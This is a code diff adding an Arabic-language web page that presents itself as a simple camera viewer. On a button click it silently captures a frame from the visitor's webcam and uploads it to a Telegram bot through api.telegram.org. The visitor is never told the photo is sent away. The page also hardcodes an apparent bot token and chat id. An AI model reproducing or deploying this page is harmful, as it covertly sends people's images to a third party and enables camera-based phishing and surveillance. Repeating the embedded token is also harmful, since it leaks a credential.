@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فتح الكاميرا وعرض الفيديو</title>
+</head>
+<body>
+    <h2>الرجاء السماح بالكاميرا لعرض الفيديو</h2>
+    <video id="video" width="320" height="240" autoplay></video>
+    <button id="capture">التقاط صورة</button>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        // الحصول على الكاميرا وعرض الفيديو
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                document.getElementById('video').srcObject = stream;
+            })
+            .catch(function (error) {
+                console.log("خطأ في الوصول إلى الكاميرا: ", error);
+            });
+
+        document.getElementById('capture').addEventListener('click', function () {
+            let video = document.getElementById('video');
+            let canvas = document.getElementById('canvas');
+            let context = canvas.getContext('2d');
+            // رسم الفيديو على اللوحة
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // إرسال الصورة إلى بوت تليجرام
+            canvas.toBlob(function (blob) {
+                let formData = new FormData();
+                formData.append("photo", blob);
+
+                fetch('https://api.telegram.org/bot<7857983552:AAFRI1z-BJzmIDC_0_nsnqmA4V1cYBUzJ9A>/sendPhoto?chat_id=<7857983552>', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.json())
+                  .then(data => console.log('تم إرسال الصورة بنجاح:', data))
+                  .catch(error => console.error('حدث خطأ:', error));
+            });
+        });
+    </script>
+</body>
+</html>
